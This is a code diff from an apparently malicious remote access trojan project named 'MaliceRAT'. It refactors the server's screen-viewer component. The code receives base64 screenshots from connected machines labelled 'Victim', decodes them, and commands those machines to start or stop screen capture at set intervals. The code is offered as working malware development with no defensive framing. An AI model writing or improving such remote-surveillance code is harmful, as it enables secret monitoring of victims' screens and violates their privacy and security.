@@ -8,44 +8,42 @@ namespace MaliceRAT.RatServer
     {
         #region Variables
         private JavaScriptSerializer serializer = new JavaScriptSerializer();
-        private StringBuilder screenshotBuilder = new StringBuilder();
         public event Action<byte[]> ScreenshotReceived;
         #endregion
 
         #region Methods
-        public void HandleScreenshotChunk(string data, bool final)
+        private Server server;
+
+        public ScreenViewer(Server server)
         {
-            screenshotBuilder.Append(data);
-            if (final)
+            this.server = server;
+            server.MessageReceived += HandleMessage;
+        }
+
+        private void HandleMessage(Victim victim, dynamic jsonMessage)
+        {
+            if (jsonMessage["type"] == "screenshot")
             {
-                byte[] screenshotData = Convert.FromBase64String(screenshotBuilder.ToString());
-                screenshotBuilder.Clear();
+                byte[] screenshotData = Convert.FromBase64String(jsonMessage["data"].ToString());
                 ScreenshotReceived?.Invoke(screenshotData);
             }
         }
 
-        public void SetScreenUpdateInterval(Victim client, int interval)
+        public void SetScreenUpdateInterval(Victim victim, int interval)
         {
-            string message = serializer.Serialize(new { type = "set_interval", interval });
-            SendMessageTo(client, message);
+            victim.Send(new { type = "set_interval", interval });
         }
 
-        public void RequestScreenshot(Victim client)
+        public void RequestScreenshot(Victim victim)
         {
-            SetScreenUpdateInterval(client, 1000);
+            SetScreenUpdateInterval(victim, 1000);
             Action<byte[]> handler = null;
             handler = (data) =>
             {
-                SetScreenUpdateInterval(client, 0);
+                SetScreenUpdateInterval(victim, 0);
                 ScreenshotReceived -= handler;
             };
             ScreenshotReceived += handler;
-        }
-
-        private void SendMessageTo(Victim client, string message)
-        {
-            byte[] data = Encoding.UTF8.GetBytes(message);
-            client.TcpClient.GetStream().Write(data, 0, data.Length);
         }
         #endregion
     }
